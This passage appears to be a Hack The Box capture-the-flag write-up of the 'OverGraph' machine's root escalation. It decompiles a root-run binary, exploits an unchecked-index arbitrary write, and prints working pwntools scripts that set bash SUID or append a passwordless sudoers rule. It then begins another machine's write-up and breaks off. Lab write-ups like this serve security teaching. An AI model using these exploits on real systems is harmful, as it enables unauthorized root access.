/lib/systemd/systemd-udevd root 662 0.0 0.4 214596 17944 ? SLsl Jul31 0:06 /sbin/multipathd -d -s root 705 0.0 0.2 47540 10608 ? Ss Jul31 0:00 /usr/bin/VGAuthService root 710 0.1 0.2 311508 8332 ? Ssl Jul31 0:58 /usr/bin/vmtoolsd root 711 0.0 0.1 99896 5804 ? Ssl Jul31 0:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0 root 756 0.0 0.2 239276 9268 ? Ssl Jul31 0:01 /usr/lib/accountsservice/accounts-daemon root 780 0.0 0.0 81956 3788 ? Ssl Jul31 0:02 /usr/sbin/irqbalance --foreground root 787 0.0 0.1 16660 7756 ? Ss Jul31 0:00 /lib/systemd/systemd-logind root 788 0.0 0.3 394876 13472 ? Ssl Jul31 0:00 /usr/lib/udisks2/udisksd root 815 0.0 0.2 236416 9100 ? Ssl Jul31 0:00 /usr/lib/policykit-1/polkitd --no-debug root 932 0.0 0.0 6812 2996 ? Ss Jul31 0:00 /usr/sbin/cron -f root 933 0.0 0.0 8480 3384 ? S Jul31 0:00 \\_ /usr/sbin/CRON -f root 934 0.0 0.0 8480 3384 ? S Jul31 0:00 \\_ /usr/sbin/CRON -f root 935 0.0 0.0 8352 3356 ? S Jul31 0:00 \\_ /usr/sbin/CRON -f root 949 0.0 0.0 2608 536 ? Ss Jul31 0:00 \\_ /bin/sh -c sh -c 'socat tcp4-listen:9851,reuseaddr,fork,bind=127.0.0.1 exec:/usr/local/bin/Nreport/nreport,pty,stderr' root 950 0.0 0.0 2608 536 ? S Jul31 0:00 \\_ sh -c socat tcp4-listen:9851,reuseaddr,fork,bind=127.0.0.1 exec:/usr/local/bin/Nreport/nreport,pty,stderr root 951 0.0 0.0 6964 1828 ? S Jul31 0:00 \\_ socat tcp4-listen:9851,reuseaddr,fork,bind=127.0.0.1 exec:/usr/local/bin/Nreport/nreport,pty,stderr root 964 0.0 0.1 12172 7324 ? Ss Jul31 0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups root 8687 0.0 0.2 13660 8772 ? Ss 14:46 0:00 \\_ sshd: user [priv] user 8804 0.0 0.0 6300 656 pts/0 S+ 14:48 0:00 \\_ grep --color=auto root root 966 0.0 0.0 55276 1564 ? Ss Jul31 0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on; root 970 0.0 0.0 5828 1824 tty1 Ss+ Jul31 0:00 /sbin/agetty -o -p -- \\u --noclear tty1 linux root 981 0.0 0.1 6532 5004 ? Ss Jul31 0:02 /usr/sbin/apache2 -k start  It\u0026rsquo;s this command:\nsocat tcp4-listen:9851,reuseaddr,fork,bind=127.0.0.1 exec:/usr/local/bin/Nreport/nreport,pty,stderr  The command runs a binary file at /usr/local/bin/Nreport/nreport:\nuser@overgraph:~$ file /usr/local/bin/Nreport/nreport /usr/local/bin/Nreport/nreport: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /usr/local/bin/Nreport/libc/ld-2.25.so, for GNU/Linux 3.2.0, BuildID[sha1]=fab56bbb7a23ada8a8f5943b527d16f3cdcb09e5, not stripped user@overgraph:~$ ls -l /usr/local/bin/Nreport/nreport -rwxr-xr-x 1 root root 26040 Feb 14 12:30 /usr/local/bin/Nreport/nreport  It is very likely that we need to exploit this binary to become root. Let\u0026rsquo;s download the binary and analyze it with Ghidra:\nuser@overgraph:~$ cd /usr/local/bin/Nreport/ user@overgraph:/usr/local/bin/Nreport$ python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 10.10.17.44 - - [] \"GET /nreport HTTP/1.1\" 200 - ^C Keyboard interrupt received, exiting.  $ wget -q 10.10.11.157:8000/nreport  Plus, we might want to download shared libraries used by the binary to have the same working environment as in the remote machine:\nuser@overgraph:/usr/local/bin/Nreport$ ll total 40 drwxr-xr-x 3 root root 4096 Apr 12 17:38 ./ drwxr-xr-x 3 root root 4096 Apr 12 17:38 ../ drwxr-xr-x 2 root root 4096 Feb 14 18:31 libc/ -rwxr-xr-x 1 root root 26040 Feb 14 12:30 nreport* user@overgraph:/usr/local/bin/Nreport$ ll libc/ total 31716 drwxr-xr-x 2 root root 4096 Feb 14 18:31 ./ drwxr-xr-x 3 root root 4096 Apr 12 17:38 ../ -rwxr-xr-x 1 root root 1250280 Feb 13 14:17 ld-2.25.so* -rwxr-xr-x 1 root root 1250280 Feb 13 14:17 ld.so.2* -rwxr-xr-x 1 root root 14979184 Feb 14 18:29 libc-2.25.so* -rwxr-xr-x 1 root root 14978536 Feb 13 14:17 libc.so.6* user@overgraph:/usr/local/bin/Nreport$ python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 10.10.17.44 - - [01/Aug/2022 15:36:57] \"GET /libc/libc.so.6 HTTP/1.1\" 200 - 10.10.17.44 - - [01/Aug/2022 15:37:18] \"GET /libc/libc-2.25.so HTTP/1.1\" 200 - 10.10.17.44 - - [01/Aug/2022 15:37:43] \"GET /libc/ld-2.25.so HTTP/1.1\" 200 - 10.10.17.44 - - [01/Aug/2022 15:37:48] \"GET /libc/ld.so.2 HTTP/1.1\" 200 - ^C Keyboard interrupt received, exiting.  $ mkdir libc $ cd libc $ wget -q 10.10.11.157:8000/libc/{libc.so.6,libc-2.25.so,ld.so.2,ld-2.25.so}  Using pwninit, we can patch the binary so that it uses the specific shared library and loader indicated:\n$ pwninit --libc libc/libc.so.6 --ld libc/ld.so.2 --bin nreport --no-template bin: nreport libc: libc/libc.so.6 ld: libc/ld.so.2 warning: failed detecting libc version (is the libc an Ubuntu glibc?): failed finding version string copying nreportto nreport_patched running patchelf on nreport_patched  Analyzing the nreport binary This is the main function:\nvoidmain() { intiVar1; longin_FS_OFFSET; charoption[3]; undefined8 canary;  canary =*(undefined8 *) (in_FS_OFFSET +0x28); puts(\"Custom Reporting v1\\n\"); auth(); printf(\"\\nWelcome %s\", userinfo1); do{ puts(\"\\n1.Create New Message\\n2.Delete a Message\\n3.Edit Messages\\n4.Report All Messages\\n5.Exit\"); printf(\"\u0026gt; \"); __isoc99_scanf(\" %1[^\\n]\", option); iVar1 =atoi(option); switch(iVar1) { case1: create(); break; case2: delete(); break; case3: edit(); break; case4: report(); break; case5: system(userinfo1 +0x28); /* WARNING: Subroutine does not return */ exit(0); } } while(true); }  The first thing that it does is call auth to request a token:\nuser@overgraph:/usr/local/bin/Nreport$ ./nreport Custom Reporting v1 Enter Your Token: 1234 Invalid Token  This is the auth function:\nvoidauth() { size_tsVar1; longin_FS_OFFSET; inti; undefined8 local_48; undefined8 local_40; undefined8 local_38; undefined8 local_30; undefined8 local_28; undefined8 local_20; undefined8 local_18; longcanary;  canary =*(long*) (in_FS_OFFSET +0x28); local_48 =0; local_40 =0; local_38 =0; local_30 =0; local_28 =0; local_20 =0; local_18 =0; printf(\"Enter Your Token: \"); fgets(userinfo1 +0x78, 19, stdin); sVar1 =strlen(userinfo1 +0x78); if(sVar1 !=15) { puts(\"Invalid Token\"); /* WARNING: Subroutine does not return */ exit(0); } for(i =13; -1\u0026lt;i; i =i +-1) { *(uint*) ((long) \u0026amp;local_48 +(long) i *4) = *(uint*) (secret +(long) i *4) ^(int) userinfo1[121] ^(int) userinfo1[122] ^ (int) userinfo1[120] ^(int) userinfo1[129] ^(int) userinfo1[133]; } if((int) local_40 +(int) local_48 +local_48._4_4_ !=0x134) { puts(\"Invalid Token\"); /* WARNING: Subroutine does not return */ exit(0); } if(local_28._4_4_ +local_30._4_4_ +(int) local_28 !=0x145) { puts(\"Invalid Token\"); /* WARNING: Subroutine does not return */ exit(0); } if(local_18._4_4_ +local_20._4_4_ +(int) local_18 !=0x109) { puts(\"Invalid Token\"); /* WARNING: Subroutine does not return */ exit(0); } printf(\"Enter Name: \"); __isoc99_scanf(\" %39[^\\n]\", userinfo1); userinfo1._140_8_ =0x7672632f74706f2f; userinfo1._148_2_ =0x2f31; userinfo1[150] =0; strcat(userinfo1 +0x8c, userinfo1); userinfo1._40_8_ =0x614c22206f686365; userinfo1._48_8_ =0x2064657355207473; userinfo1._56_8_ =0x7461642824206e4f; userinfo1._64_8_ =0x2f203e3e20222965; userinfo1._72_8_ =0x2f676f6c2f726176; userinfo1._80_8_ =0x74726f7065726b; if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } userinfo1._40_8_ =0x614c22206f686365; userinfo1._48_8_ =0x2064657355207473; userinfo1._56_8_ =0x7461642824206e4f; userinfo1._64_8_ =0x2f203e3e20222965; userinfo1._72_8_ =0x2f676f6c2f726176; userinfo1._80_8_ =0x74726f7065726b; return; }  The first thing we need to do is craft a token that passes all checks:\nprintf(\"Enter Your Token: \"); fgets(userinfo1 +120, 19, stdin); sVar1 =strlen(userinfo1 +120); if(sVar1 !=15) { puts(\"Invalid Token\"); /* WARNING: Subroutine does not return */ exit(0); } for(i =13; -1\u0026lt;i; i =i +-1) { *(uint*) ((long) \u0026amp;local_48 +(long) i *4) = *(uint*) (secret +(long) i *4) ^(int) userinfo1[121] ^(int) userinfo1[122] ^ (int) userinfo1[120] ^(int) userinfo1[129] ^(int) userinfo1[133]; } if((int) local_40 +(int) local_48 +local_48._4_4_ !=0x134) { puts(\"Invalid Token\"); /* WARNING: Subroutine does not return */ exit(0); } if(local_28._4_4_ +local_30._4_4_ +(int) local_28 !=0x145) { puts(\"Invalid Token\"); /* WARNING: Subroutine does not return */ exit(0); } if(local_18._4_4_ +local_20._4_4_ +(int) local_18 !=0x109) { puts(\"Invalid Token\"); /* WARNING: Subroutine does not return */ exit(0); }  The first check is that the token length must be 15 bytes, that\u0026rsquo;s easy. Well, actually 14, because the last one is the new line character (\\n).\nThen, the program performs a XOR operation with a secret variable and some of the bytes we entered. Actually, these bytes are userinfo1[120], userinfo1[121], userinfo1[122], userinfo1[129] and userinfo1[133]. The rest of the bytes do not matter. For this reason, we can use a brute force attack on these 5 bytes until we find a valid token (there are several ones). For that, I wrote a simple Python script using pwntools: bf_token.py (detailed explanation here):\n$ python3 bf_token.py [*] './nreport_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3fd000) RUNPATH: b'./libc' [+] Valid token: hD]AAAAAAVAAAT $ ./nreport_patched Custom Reporting v1 Enter Your Token: hD]AAAAAAVAAAT Enter Name: asdf Welcome asdf 1.Create New Message 2.Delete a Message 3.Edit Messages 4.Report All Messages 5.Exit \u0026gt;  Planning the exploit Now we get to the menu we saw in main. It seems to be like a common heap exploitation challenge.\nIn fact, if we analyze functions create, delete and edit, all of them use calloc and free, so we are dealing with the heap address space:\nvoidcreate() { void*pvVar1;  printf(\"\\nYou can only create 10 messages at a time\\nMessages Created: %i\\n\\n\", (ulong) Arryindex); pvVar1 =calloc(1, 0xa1); printf(\"Message Title: \"); __isoc99_scanf(\" %59[^\\n]\", pvVar1); printf(\"Message: \"); __isoc99_scanf(\" %100[^\\n]\", (long) pvVar1 +0x3c); *(void**) (message_array +(long) (int) Arryindex *8) =pvVar1; Arryindex =Arryindex +1; return; }  voiddelete() { longin_FS_OFFSET; intindex; longcanary;  canary =*(long*) (in_FS_OFFSET +0x28); printf(\"Message number to delete: \"); __isoc99_scanf(\"%d[^\\n]\", \u0026amp;index); free(*(void**) (message_array +(long) index *8)); Arryindex =Arryindex -1; puts(\"\\nMessage Deleted\"); if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return; }  voidedit() { longin_FS_OFFSET; intindex; longcanary;  canary =*(long*) (in_FS_OFFSET +0x28); if(Arryindex ==0) { puts(\"No Message Created\"); } else{ printf(\"Enter number to edit: \"); __isoc99_scanf(\"%d[^\\n]\", \u0026amp;index); printf(\"Message Title: \"); __isoc99_scanf(\" %59[^\\n]\", *(undefined8 *) (message_array +(long) index *8)); printf(\"Message: \"); __isoc99_scanf(\"%100[^\\n]\", *(long*) (message_array +(long) index *8) +0x3c); fflush(stdin); fflush(stdout); } if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return; }  However, there\u0026rsquo;s not much to do with a heap exploit. Although it is possible to perform an Unsorted Bin Attack, we can\u0026rsquo;t leverage it to something more critical or it will be very difficult to achieve. This attack is possible because we can edit released chunks and modify the bk pointer, so that when allocating a new chunk, an address of main_arena will be written to the address at bk (more information in Nightmare). You can forget about this if you didn\u0026rsquo;t understand, it won\u0026rsquo;t be necessary.\nA successful exploit for this binary has nothing to do with the heap address space. In fact, let\u0026rsquo;s examine carefully these lines of edit:\nprintf(\"Enter number to edit: \"); __isoc99_scanf(\"%d[^\\n]\", \u0026amp;index); printf(\"Message Title: \"); __isoc99_scanf(\" %59[^\\n]\", *(undefined8 *) (message_array +(long) index *8));  Can you see the bug? Yes, the program asks for an index and then it will use it as an offset to compute the address to write to (message_array + index * 8). Since there is no validation on the index, we can control where to write (that\u0026rsquo;s a write-what-where primitive). Let\u0026rsquo;s check it using GDB some variables that are in auth after entering a valid token:\n$ gdb -q ./nreport_patched Reading symbols from ./nreport_patched... (No debugging symbols found in ./nreport_patched) gef➤ run Starting program: /home/rocky/Desktop/HTB/Machines/OverGraph/nreport_patched Custom Reporting v1 Enter Your Token: hD]AAAAAAVAAAT Enter Name: asdf Welcome asdf 1.Create New Message 2.Delete a Message 3.Edit Messages 4.Report All Messages 5.Exit \u0026gt; ^C Program received signal SIGINT, Interrupt. 0x00007ffff7b18ad0 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84 84 ../sysdeps/unix/syscall-template.S: No such file or directory.  For example, we have a global variable called userinfo1, which is referenced as userinfo1, userinfo1 + 40, userinfo1 + 0x78 and userinfo1 + 140:\ngef➤ x/s (char *) \u0026userinfo1 0x404180 \u0026lt;userinfo1\u0026gt;: \"asdf\" gef➤ x/s (char *)\u0026userinfo1+40 0x4041a8 \u0026lt;userinfo1+40\u0026gt;: \"echo \\\"Last Used On $(date)\\\" \u0026gt;\u0026gt; /var/log/kreport\" gef➤ x/s (char *) \u0026userinfo1 + 0x78 0x4041f8 \u0026lt;userinfo1+120\u0026gt;: \"hD]AAAAAAVAAAT\\n\" gef➤ x/s (char *) \u0026userinfo1 + 140 0x40420c \u0026lt;userinfo1+140\u0026gt;: \"/opt/crv1/asdf\"  Here we have some interesting things:\n The string \u0026quot;asdf\u0026quot; (our name) is something we can control The string \u0026quot;echo \\\u0026quot;Last Used On $(date)\\\u0026quot; \u0026gt;\u0026gt; /var/log/kreport\u0026quot; is used as a system command right before the exit option (5) The string \u0026quot;/opt/crv1/asdf\u0026quot; will be the file where the function report will output our messages  Furthermore, these are the addresses of message_array:\ngef➤ x/40gx \u0026message_array 0x404120 \u0026lt;message_array\u0026gt;: 0x0000000000000000 0x0000000000000000 0x404130 \u0026lt;message_array+16\u0026gt;: 0x0000000000000000 0x0000000000000000 0x404140 \u0026lt;message_array+32\u0026gt;: 0x0000000000000000 0x0000000000000000 0x404150 \u0026lt;message_array+48\u0026gt;: 0x0000000000000000 0x0000000000000000 0x404160 \u0026lt;message_array+64\u0026gt;: 0x0000000000000000 0x0000000000000000 0x404170: 0x0000000000000000 0x0000000000000000 0x404180 \u0026lt;userinfo1\u0026gt;: 0x0000000066647361 0x0000000000000000 0x404190 \u0026lt;userinfo1+16\u0026gt;: 0x0000000000000000 0x0000000000000000 0x4041a0 \u0026lt;userinfo1+32\u0026gt;: 0x0000000000000000 0x614c22206f686365 0x4041b0 \u0026lt;userinfo1+48\u0026gt;: 0x2064657355207473 0x7461642824206e4f 0x4041c0 \u0026lt;userinfo1+64\u0026gt;: 0x2f203e3e20222965 0x2f676f6c2f726176 0x4041d0 \u0026lt;userinfo1+80\u0026gt;: 0x0074726f7065726b 0x0000000000000000 0x4041e0 \u0026lt;userinfo1+96\u0026gt;: 0x0000000000000000 0x0000000000000000 0x4041f0 \u0026lt;userinfo1+112\u0026gt;: 0x0000000000000000 0x41414141415d4468 0x404200 \u0026lt;userinfo1+128\u0026gt;: 0x000a544141415641 0x74706f2f00000000 0x404210 \u0026lt;userinfo1+144\u0026gt;: 0x73612f317672632f 0x0000000000006664 0x404220 \u0026lt;userinfo1+160\u0026gt;: 0x0000000000000000 0x0000000000000000 0x404230: 0x0000000000000000 0x0000000000000000 0x404240: 0x0000000000000000 0x0000000000000000 0x404250: 0x0000000000000000 0x0000000000000000  For the moment, let\u0026rsquo;s create a message:\ngef➤ continue Continuing. 1 You can only create 10 messages at a time Messages Created: 0 Message Title: AAAA Message: BBBB 1.Create New Message 2.Delete a Message 3.Edit Messages 4.Report All Messages 5.Exit \u0026gt; ^C Program received signal SIGINT, Interrupt. 0x00007ffff7b18ad0 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84 84 in ../sysdeps/unix/syscall-template.S  Now, if we print the contents of message_array, we see an address (0x405830):\ngef➤ x/40gx \u0026message_array 0x404120 \u0026lt;message_array\u0026gt;: 0x0000000000405830 0x0000000000000000 0x404130 \u0026lt;message_array+16\u0026gt;: 0x0000000000000000 0x0000000000000000 0x404140 \u0026lt;message_array+32\u0026gt;: 0x0000000000000000 0x0000000000000000 0x404150 \u0026lt;message_array+48\u0026gt;: 0x0000000000000000 0x0000000000000000 0x404160 \u0026lt;message_array+64\u0026gt;: 0x0000000000000000 0x0000000000000000 0x404170: 0x0000000000000000 0x0000000000000000 0x404180 \u0026lt;userinfo1\u0026gt;: 0x0000000066647361 0x0000000000000000 0x404190 \u0026lt;userinfo1+16\u0026gt;: 0x0000000000000000 0x0000000000000000 0x4041a0 \u0026lt;userinfo1+32\u0026gt;: 0x0000000000000000 0x614c22206f686365 0x4041b0 \u0026lt;userinfo1+48\u0026gt;: 0x2064657355207473 0x7461642824206e4f 0x4041c0 \u0026lt;userinfo1+64\u0026gt;: 0x2f203e3e20222965 0x2f676f6c2f726176 0x4041d0 \u0026lt;userinfo1+80\u0026gt;: 0x0074726f7065726b 0x0000000000000000 0x4041e0 \u0026lt;userinfo1+96\u0026gt;: 0x0000000000000000 0x0000000000000000 0x4041f0 \u0026lt;userinfo1+112\u0026gt;: 0x0000000000000000 0x41414141415d4468 0x404200 \u0026lt;userinfo1+128\u0026gt;: 0x000a544141415641 0x74706f2f00000000 0x404210 \u0026lt;userinfo1+144\u0026gt;: 0x73612f317672632f 0x0000000000006664 0x404220 \u0026lt;userinfo1+160\u0026gt;: 0x0000000000000000 0x0000000000000000 0x404230: 0x0000000000000000 0x0000000000000000 0x404240: 0x0000000000000000 0x0000000000000000 0x404250: 0x0000000000000000 0x0000000000000000  And in this address we have our message (as a heap chunk):\ngef➤ x/30gx 0x0000000000405830 - 0x10 0x405820: 0x0000000000000000 0x00000000000000b1 0x405830: 0x0000000041414141 0x0000000000000000 0x405840: 0x0000000000000000 0x0000000000000000 0x405850: 0x0000000000000000 0x0000000000000000 0x405860: 0x0000000000000000 0x4242424200000000 0x405870: 0x0000000000000000 0x0000000000000000 0x405880: 0x0000000000000000 0x0000000000000000 0x405890: 0x0000000000000000 0x0000000000000000 0x4058a0: 0x0000000000000000 0x0000000000000000 0x4058b0: 0x0000000000000000 0x0000000000000000 0x4058c0: 0x0000000000000000 0x0000000000000000 0x4058d0: 0x0000000000000000 0x0000000000020731 0x4058e0: 0x0000000000000000 0x0000000000000000 0x4058f0: 0x0000000000000000 0x0000000000000000 0x405900: 0x0000000000000000 0x0000000000000000  When using the edit function, the program will ask for an index. And the address to write will be calculated as message_array + index * 8. Since the binary is not protected with PIE, message_array will have a fix address (0x404120). Hence, the target address will be 0x404120 + index * 8.\nSince we control what to store as username (placed at userinfo1, 0x404180), we can enter here an address that we would want to write to. And to tell the program to use our username as address, we must use 12 as index (12 = (0x404180 - 0x404120) / 8). Let\u0026rsquo;s try it right now:\ngef➤ continue Continuing. 3 Enter number to edit: 12 Message Title: XXXX Program received signal SIGSEGV, Segmentation fault. 0x00007ffff7a95f5f in _IO_vfscanf_internal (s=\u0026lt;optimized out\u0026gt;, format=\u0026lt;optimized out\u0026gt;, argptr=argptr@entry=0x7fffffffe578, errp=errp@entry=0x0) at vfscanf.c:2 892 2892 vfscanf.c: No such file or directory.  We get a segmentation fault, because the program is trying to write 0x58 (X) into address 0x66647361 (asdf in hexadecimal format, little-endian):\ngef➤ x/i $rip =\u0026gt; 0x7ffff7a95f5f \u0026lt;_IO_vfscanf_internal+12911\u0026gt;: mov BYTE PTR [r14],r8b gef➤ p $r14 $1 = 0x66647361 gef➤ p $r8 $2 = 0x58  Privilege escalation So we can potentially modify memory data. Here we have plenty of possibilities. One is to modify the command that is saved in userinfo1 + 40:\necho\"Last Used On $(date)\"\u0026gt;\u0026gt;/var/log/kreport  We can change it to be chmod 4755 /bin/bash, for example. Since the process is running as root, the command will be executed by root. To do so, our username must be the address of userinfo1 + 40 (0x404180 + 40 = 0x4041a8). Next, we can use a simple pwntools script to perform the attack (exploit_rce.py):\n#!/usr/bin/env python3 frompwnimportcontext, log, p64, remote, sys context.binary='nreport_patched' defmain(): token=b'hD]AAAAAAVAAAT' iflen(sys.argv) !=3: log.error(f'Usage: python3 {sys.argv[0]}\u0026lt;ip\u0026gt; \u0026lt;port\u0026gt;') host, port=sys.argv[1], sys.argv[2] p=remote(host, int(port)) p.sendlineafter(b'Enter Your Token: ', token) p.sendlineafter(b'Enter Name: ', p64(context.binary.sym.userinfo1 +40)) p.sendlineafter(b'\u0026gt; ', b'1') p.sendlineafter(b'Message Title: ', b'AAAA') p.sendlineafter(b'Message: ', b'BBBB') p.sendlineafter(b'\u0026gt; ', b'3') p.sendlineafter(b'Enter number to edit: ', b'12') p.sendlineafter(b'Message Title: ', b'chmod 4755 /bin/bash\\0') p.sendlineafter(b'\u0026gt; ', b'5') p.close() if__name__=='__main__': main()  Notice that the binary runs with socat at 127.0.0.1:9851, so we need to forward the port to access it from our attacker machine. The port forwarding can be done in SSH (ENTER + ~C to access the ssh\u0026gt; prompt):\nuser@overgraph:/usr/local/bin/Nreport$ ls -l /bin/bash -rwxr-xr-x 1 root root 1183448 Apr 18 09:14 /bin/bash user@overgraph:/usr/local/bin/Nreport$ ssh\u0026gt; -L 9851:127.0.0.1:9851 Forwarding port. user@overgraph:/usr/local/bin/Nreport$  Now we run the exploit:\n$ python3 exploit_rce.py 127.0.0.1 9851 [*] './nreport_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3fd000) RUNPATH: b'./libc' [+] Opening connection to 127.0.0.1 on port 9851: Done [*] Closed connection to 127.0.0.1 port 9851  And we see that /bin/bash is now SUID, so we can run Bash as root:\nuser@overgraph:/usr/local/bin/Nreport$ ls -l /bin/bash -rwsr-xr-x 1 root root 1183448 Apr 18 09:14 /bin/bash user@overgraph:/usr/local/bin/Nreport$ bash -p bash-5.0# cat /root/root.txt 413a25bd4e358c7863dd13455c053247  Just for fun, another option is to modify the path /opt/crv1/ + \u0026lt;username\u0026gt; to be /etc/passwd, /etc/sudoers or /root/.ssh/authorized_keys and append the necessary data to escalate privileges using the report function:\nvoidreport() { longin_FS_OFFSET; intoption; intindex; inti; FILE *fp; longcanary;  canary =*(long*) (in_FS_OFFSET +0x28); fp =fopen(userinfo1 +0x8c, \"a\"); puts(\"1.Report Specific Message\"); puts(\"2.Report All Messages\"); printf(\"\u0026gt; \"); __isoc99_scanf(\"%d\", \u0026amp;option); if(option ==1) { printf(\"Index: \"); __isoc99_scanf(\"%d\", \u0026amp;index); if(Arryindex \u0026lt;index) { printf(\"Invalid Index\"); } fprintf(fp,\"%s\", *(long*) (message_array +(long) index *8) +0x3c); fprintf(fp,\"%s\\n\", *(undefined8 *) (message_array +(long) index *8)); printf(\"File stored At: %s\\n\", 0x40420c); } elseif(option ==2) { for(i =0; i \u0026lt;Arryindex; i =i +1) { fprintf(fp,\"%s\", *(long*) (message_array +(long) i *8) +0x3c); fprintf(fp,\"%s\\n\", *(undefined8 *) (message_array +(long) i *8)); } printf(\"File stored At: %s\\n\", 0x40420c); } else{ puts(\"Invalid Option\"); } fclose(fp); if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return; }  Basically, this function writes our messages into a file at /opt/crv1/ + \u0026lt;username\u0026gt; (as root).\nBefore I discovered the vulnerability in edit, I thought that I could enter some ../ in the username and trick the program to write to /opt/crv1/../../etc/sudoers (or any other file). But it does not work because /opt/crv1 does not exist:\nuser@overgraph:/usr/local/bin/Nreport$ ls -la /opt total 16 drwxr-xr-x 3 root root 4096 Apr 12 17:38 . drwxr-xr-x 18 root root 4096 Apr 12 17:38 .. -rw-r--r-- 1 root root 168 Apr 8 18:39 conv.sh drwxr-xr-x 3 root root 4096 Apr 12 17:38 google  Using the write-what-where primitive, we can modify the path to be /etc/sudoers and then append user ALL=NOPASSWD:ALL (notice that the file is opened in \u0026quot;a\u0026quot; mode, which means \u0026ldquo;append\u0026rdquo;).\nThe address of the path is userinfo1 + 140 (0x404180 + 140 = 0x40420c). Here there is a problem because \\x0c is considered a new line character by fgets (actually, \\x0a, \\x0b, \\x0c and \\x0d), so it won\u0026rsquo;t work. To avoid this, we can write at 0x40420e using pt/../etc/sudoers, so that the overwritten path is /opt/../etc/sudoers.\nThe way that data is written is \u0026lt;message\u0026gt; \u0026lt;message-title\u0026gt;, so we can take advantage of the whitespace and separate user and ALL=PASSWORD:ALL in our payload.\nThis will be the exploit code to write to /etc/sudoers (exploit_write.py):\n#!/usr/bin/env python3 frompwnimportcontext, log, p64, remote, sys context.binary='nreport_patched' defmain(): token=b'hD]AAAAAAVAAAT' iflen(sys.argv) !=3: log.error(f'Usage: python3 {sys.argv[0]}\u0026lt;ip\u0026gt; \u0026lt;port\u0026gt;') host, port=sys.argv[1], sys.argv[2] p=remote(host, int(port)) p.sendlineafter(b'Enter Your Token: ', token) p.sendlineafter(b'Enter Name: ', p64(context.binary.sym.userinfo1 +140+2)) p.sendlineafter(b'\u0026gt; ', b'1') p.sendlineafter(b'Message Title: ', b'ALL=NOPASSWD:ALL') p.sendlineafter(b'Message: ', b'user') p.sendlineafter(b'\u0026gt; ', b'3') p.sendlineafter(b'Enter number to edit: ', b'12') p.sendlineafter(b'Message Title: ', b'pt/../etc/sudoers') p.sendlineafter(b'\u0026gt; ', b'4') p.sendlineafter(b'\u0026gt; ', b'2') p.close() if__name__=='__main__': main()  user@overgraph:/usr/local/bin/Nreport$ ls -l --time-style=+ /etc/sudoers -r--r----- 1 root root 755 /etc/sudoers user@overgraph:/usr/local/bin/Nreport$ sudo -l [sudo] password for user:  $ python3 exploit_write.py 127.0.0.1 9851 [*] './nreport_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3fd000) RUNPATH: b'./libc' [+] Opening connection to 127.0.0.1 on port 9851: Done [*] Closed connection to 127.0.0.1 port 9851  And now we have sudo privileges without password:\nuser@overgraph:/usr/local/bin/Nreport$ ls -l --time-style=+ /etc/sudoers -r--r----- 1 root root 777 /etc/sudoers user@overgraph:/usr/local/bin/Nreport$ sudo -l Matching Defaults entries for user on overgraph: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User user may run the following commands on overgraph: (root) NOPASSWD: ALL user@overgraph:/usr/local/bin/Nreport$ sudo su root@overgraph:/usr/local/bin/Nreport# cat /root/root.txt 413a25bd4e358c7863dd13455c053247  ","image":"/images/HTB/OverGraph/OverGraph.png","permalink":"https://7rocky.github.io/en/htb/overgraph/","section":"htb","summary":"Hack The Box. Linux. Hard machine. This machine contains a website that is vulnerable to Open Redirect, a web application built with AngularJS which is vulnerable to Client-Side Template Injection and XSS, and a GraphQL endpoint. We are able to register a new account bypassing an OTP code using a NoSQLi payload. Then, we can perform a CSRF attack abusing the Open Redirect to inject an XSS payload on the victim\u0026rsquo;s profile in order to get an adminToken stored in localStorage. After that, we are able to upload video files that are processed with ffmpeg, so we can exploit a Server-Side Request Forgery vulnerability to read files from the server. Eventually, we will access as a user to the machine and find a binary that is running as root. Having analyzed the binary, we can obtain a valid token to use the program and exploit a vulnerability to write arbitrary data at an arbitrary address, leading to RCE or write permissions as root","time":29,"title":"OverGraph"},{"contents":"  OS: Linux   Difficulty: Easy   IP Address: 10.10.11.156   Release: 23 / 04 / 2022   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.156 -p 22,80 Nmap scan report for 10.10.11.156 Host is up (0.054s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA) | 256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA) |_ 256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: Late - Best online image tools Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 10.25 seconds  This machine has ports 22 (SSH) and 80 (HTTP) open.\nEnumeration If we go to http://10.10.11.156, we will see a website that talks about photos:\nIn the footer, we see support@late.htb, which indicates that there can be virtual hosts configured. Let\u0026rsquo;s use ffuf to 